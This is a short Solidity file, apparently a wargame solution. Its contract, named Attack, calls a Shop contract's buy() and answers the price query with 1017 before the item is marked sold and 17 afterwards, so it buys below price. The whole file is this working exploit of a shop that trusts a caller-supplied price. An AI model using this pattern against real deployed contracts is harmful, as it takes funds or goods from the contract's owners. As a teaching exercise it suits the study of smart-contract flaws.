// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy()external;
    function isSold()external view returns(bool);
}

contract Attack{
    IShop shop;
    constructor(IShop _shop){
        shop=_shop;
    }
    function attack()external{
        shop.buy();
    }
    function price()external view returns(uint){
       //if shop.isSold() is equal to false, its returning higher price
       //if shop.isSold() is equal to true, its returning lower price
       return shop.isSold()?17:1017;
    }
}